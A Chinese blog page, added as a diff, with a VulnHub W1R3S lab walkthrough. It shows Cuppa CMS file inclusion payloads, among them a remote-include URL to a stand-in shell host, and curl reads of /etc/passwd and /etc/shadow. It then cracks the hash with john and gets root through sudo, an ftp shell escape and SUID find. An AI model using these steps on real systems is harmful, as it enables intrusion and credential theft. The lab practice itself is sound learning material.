@@ -1,0 +1,588 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>W1R3S交流 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="W1R3S交流">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-06-30 00:00" pubdate>
+        2022年6月30日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      27
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">W1R3S交流</h1>
+            
+            <div class="markdown-body">
+              <h1 id="W1R3S交流"><a href="#W1R3S交流" class="headerlink" title="W1R3S交流"></a>W1R3S交流</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/w1r3s-101,220/">W1R3S: 1.0.1 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.145</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.145</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.145</span><br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>其他</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21/tcp</td>
+<td>open</td>
+<td>ftp</td>
+<td>Anonymous FTP login allowed</td>
+</tr>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td></td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td></td>
+</tr>
+<tr>
+<td>3306/tcp</td>
+<td>open</td>
+<td>mysql</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>21端口</strong></p>
+<blockquote>
+<p>FTP 的匿名登录一般有三种：</p>
+<ul>
+<li>用户名：anonymous；密码：Email或者为空</li>
+<li>用户名：FTP；密码：FTP或者为空</li>
+<li>用户名：USER；密码：pass</li>
+</ul>
+<p>ftp 命令参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38526635/article/details/82147980">FTP常见命令详解_luckycyong的博客-CSDN博客</a></p>
+</blockquote>
+<p>ftp 存在匿名登陆（用户名anonymous，密码为空）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ftp 192.168.135.145</span><br></code></pre></td></tr></table></figure>
+<p>下载整个ftp目录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget ftp://192.168.135.145/* --ftp-user=anonymous --ftp-password= -r</span> <br></code></pre></td></tr></table></figure>
+<p>没有发现什么可用的信息。</p>
+<p><strong>22端口</strong></p>
+<p>暂时未得到 username 和 password 的相关信息，无法使用 ssh。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh 192.168.135.145</span><br>----------------------<br>Think this is the way?<br>----------------------<br>Well,........possibly.<br>----------------------<br>kali@192.168.135.145&#x27;s password: <br></code></pre></td></tr></table></figure>
+<p><strong>3306端口</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> mysql -h 192.168.135.145 -P 3306 -uroot -p</span><br>Enter password: <br>ERROR 1130 (HY000): Host &#x27;192.168.135.141&#x27; is not allowed to connect to this MySQL server<br></code></pre></td></tr></table></figure>
+<p><strong>80端口</strong></p>
+<p>dirb 爆破目录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.145:80</span><br></code></pre></td></tr></table></figure>
+<p>找到了几个重要的目录：/administrator 和 /wordpress 。</p>
+<p>先访问 <a target="_blank" rel="noopener" href="http://192.168.135.145/administrator，发现这个是">http://192.168.135.145/administrator，发现这个是</a> Cuppa CMS 的安装设置，猜测可能已经安装了 Cuppa CMS 。</p>
+<p>再访问 <a target="_blank" rel="noopener" href="http://192.168.135.145/wordpress，发现打不开，直接">http://192.168.135.145/wordpress，发现打不开，直接</a> wpscan 扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.145/wordpress</span><br>Scan Aborted: The URL supplied redirects to http://localhost/wordpress/. Use the --ignore-main-redirect option to ignore the redirection and scan the target, or change the --url option value to the redirected URL.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://localhost/wordpress/</span><br>Scan Aborted: The url supplied &#x27;http://localhost/wordpress/&#x27; seems to be down (Couldn&#x27;t connect to server)<br></code></pre></td></tr></table></figure>
+<p>发现是个重定向，重定向到了本地，修改 hosts 文件后仍无法进行扫描 。</p>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>查找 Cuppa 漏洞脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit Cuppa</span><br>--------------------------------------------------------------------------------- --------------------------<br> Exploit Title                                                                   |  Path<br>--------------------------------------------------------------------------------- --------------------------<br>Cuppa CMS - &#x27;/alertConfigField.php&#x27; Local/Remote File Inclusion                  | php/webapps/25971.txt<br>--------------------------------------------------------------------------------- --------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
+<p>查看该文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/php/webapps/25971.txt</span><br></code></pre></td></tr></table></figure>
+<p>得到两个 payload：</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean">#####################################################<br>EXPLOIT<br>#####################################################<br>http:<span class="hljs-comment">//target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></code></pre></td></tr></table></figure>
+<p>发现该 CMS 存在一个本地/远程文件包含的漏洞。</p>
+<p>经过尝试，发现关闭了远程文件包含，只能进行本地文件包含，所以，尝试得到用户名密码后进行解密。</p>
+<h3 id="M1、burp"><a href="#M1、burp" class="headerlink" title="M1、burp"></a>M1、burp</h3><p>直接浏览器访问，读取 <code>/etc/passwd</code> 文件：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.135.145/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.135.145/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p>
+<p>显示不存在，考虑到扫到的目录为 administrator ，所以对 payload 进行如下修改：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd">http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</a></p>
+<p>再次访问，虽成功访问，但没有内容显示。</p>
+<p>用 burp 抓包，将 GET 方式改成 POST 方式，进行尝试，成功得到 <strong><code>username:w1r3s</code></strong></p>
+<p>同样的方法读取 <code>/etc/shadow</code> ：</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow">http://192.168.135.145/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/shadow</a></p>
+<p>得到用户 <code>w1r3s</code> 的 <code>salt 密码</code> ，用 <code>john</code> 破解此密码，得到<strong><code>password:computer</code></strong></p>
+<p>ssh 登录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh w1r3s@192.168.135.145</span><br><br>w1r3s@W1R3S:~$ whoami<br>\w1r3s<br>w1r3s@W1R3S:~$ id<br>uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)<br></code></pre></td></tr></table></figure>
+<h3 id="M2、Curl"><a href="#M2、Curl" class="headerlink" title="M2、Curl"></a>M2、Curl</h3><blockquote>
+<p>Curl详解：<a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南 - 阮一峰 (ruanyifeng.com)</a></p>
+</blockquote>
+<p>使用 curl 来利用 LFI 漏洞获取 <code>/etc/password</code> 文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -s --data-urlencode <span class="hljs-string">&#x27;urlConfig=../../../../../../../../../etc/passwd&#x27;</span> http://192.168.135.145/administrator/alerts/alertConfigField.php</span><br>w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash<br></code></pre></td></tr></table></figure>
+<p>找到了一个用户 <code>w1r3s</code> ，然后同样的方法读取 <code>/etc/shadow</code> ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -s --data-urlencode <span class="hljs-string">&#x27;urlConfig=../../../../../../../../../etc/shadow&#x27;</span> http://192.168.135.145/administrator/alerts/alertConfigField.php</span><br>w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::<br></code></pre></td></tr></table></figure>
+<p>找到了用户 <code>w1r3s</code> 的 <code>salt 密码</code> ，将密码复制到 <code>1.txt</code> 文件中，用 <code>john</code> 破解此密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span><br>w1r3s:computer:17567:0:99999:7:::1 password hash cracked, 0 left<br></code></pre></td></tr></table></figure>
+<p><strong>shadow 文件解析：</strong></p>
+<p>文件的格式为：{用户名}：{加密后的口令密码}：{口令最后修改时间距原点(1970-1-1)的天数}：{口令最小修改间隔(防止修改口令，如果时限未到，将恢复至旧口令)：{口令最大修改间隔}：{口令失效前的警告天数}：{账户不活动天数}：{账号失效天数}：{保留}</p>
+<blockquote>
+<p>其中{加密后的口令密码}的格式为：$id$salt$encrypted</p>
+<ul>
+<li>id为1时，采用md5算法加密</li>
+<li>id为5时，采用SHA256算法加密</li>
+<li>id为6时，采用SHA512算法加密</li>
+<li>salt为盐值，是对密码进行hash的一个干扰值</li>
+<li>encrypted为散列值</li>
+</ul>
+</blockquote>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><h3 id="M1：直接提权"><a href="#M1：直接提权" class="headerlink" title="M1：直接提权"></a>M1：直接提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">w1r3s@W1R3S:~$ sudo -l<br>[sudo] password for w1r3s: <br>Matching Defaults entries for w1r3s on W1R3S:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User w1r3s may run the following commands on W1R3S:<br>    (ALL : ALL) ALL<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 直接重置 root 密码或者直接 sudo 就能拿到 root</span><br><span class="hljs-meta">#</span><span class="bash"> 由于 ubtun 系统默认是没有激活 root 用户的，需要管理员手工进行操作 sudo passwd 或者 sudo passwd root</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 或者 sudo -i 直接无密码进入 root</span><br>w1r3s@W1R3S:~$ sudo -i<br>root@W1R3S:~# logout<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 或者 sudo su 直接无密码进入 root</span><br>w1r3s@W1R3S:~$ sudo su<br>root@W1R3S:/home/w1r3s# exit<br><br></code></pre></td></tr></table></figure>
+<h3 id="M2：ftp提权"><a href="#M2：ftp提权" class="headerlink" title="M2：ftp提权"></a>M2：ftp提权</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">w1r3s@W1R3S:~$ sudo ftp<br><span class="hljs-meta">ftp&gt;</span><span class="bash"> !/bin/bash</span><br>root@W1R3S:~# whoami<br>root<br>root@W1R3S:~# id<br>uid=0(root) gid=0(root) groups=0(root)<br></code></pre></td></tr></table></figure>
+<h3 id="M3：内核提权"><a href="#M3：内核提权" class="headerlink" title="M3：内核提权"></a>M3：内核提权</h3><p>略</p>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、ftp：信息泄露</p>
+<p>2、web cms：shell、内核漏洞、提权（成熟）</p>
+<p>3、Linux john：密码破解、在线、kali还有</p>
+<p>4、提权：</p>
+<p><strong>mysql:UDF</strong></p>
+<p><strong>core</strong></p>
+<p><strong>sudo</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo -l</span><br>[sudo] password for kali: <br>Matching Defaults entries for kali on kali:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User kali may run the following commands on kali:<br>    (ALL : ALL) ALL<br>    # (root) NOPASSWD: /usr/bin/python3<br>    # (root) NOPASSWD: /usr/bin/python3 /home/kali/a.out<br></code></pre></td></tr></table></figure>
+<p><strong>SUID</strong></p>
+<p><strong>SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 查找具有root权限的SUID的文件</span><br><span class="hljs-meta">#</span><span class="bash"> 可以看到find命令具有SUID权限，如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</span><br><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span><br>......<br>/usr/bin/find<br><span class="hljs-meta">#</span><span class="bash"> /home/kali/b.out</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls -al /usr/bin/find</span><br>ls -al /usr/bin/find<br>-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 查找根目录下名为 thefinalflag.txt 的文件并执行 shell</span><br><span class="hljs-meta">#</span><span class="bash"> -<span class="hljs-built_in">exec</span> 参数后面跟的是<span class="hljs-built_in">command</span>命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以在分号前面加反斜杠。</span><br><span class="hljs-meta">$</span><span class="bash"> find / -name thefinalflag.txt -<span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> \;</span><br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)<br></code></pre></td></tr></table></figure>
+<p><strong>root程序（agent）</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -user root -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span><br>......<br>/home/kali/b.out<br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ /usr/local/bin/agent;<br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : <br>www-data@imf:/var/www/html/imfadministrator/uploads $ ls -al /usr/local/bin/agent<br>-rwxr-xr-x 1 root root 11896 Oct 12  2016 /usr/local/bin/agent<br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ ps -aux | grep agent<br>root      1332  0.0  0.0   2188   480 ?        Ss   20:35   0:00 agent<br>www-data  1397  0.0  0.0   4500   852 ?        S    20:41   0:00 sh -c ps -aux | grep agent 2&gt;&amp;1<br>www-data  1399  0.0  0.1  11280  1028 ?        S    20:41   0:00 grep agent<br>www-data@imf:/var/www/html/imfadministrator/uploads $ ps -aux | grep agent<br>www-data  1423  0.0  0.0   2188   544 ?        S    20:44   0:00 /usr/local/bin/agent<br>www-data  1434  0.0  0.0   4500   848 ?        S    20:44   0:00 sh -c ps -aux | grep agent 2&gt;&amp;1<br>www-data  1436  0.0  0.0  11280   924 ?        S    20:44   0:00 grep agent<br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/07/01/Penetration/Vulnhub/Part-1/0x0F%20BoredHackerBlog-Social-Network/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BoredHackerBlog：Social Network</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/30/Penetration/Vulnhub/Part-1/0x0E%20Corrosion-2/">
+                        <span class="hidden-mobile">Corrosion：2</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
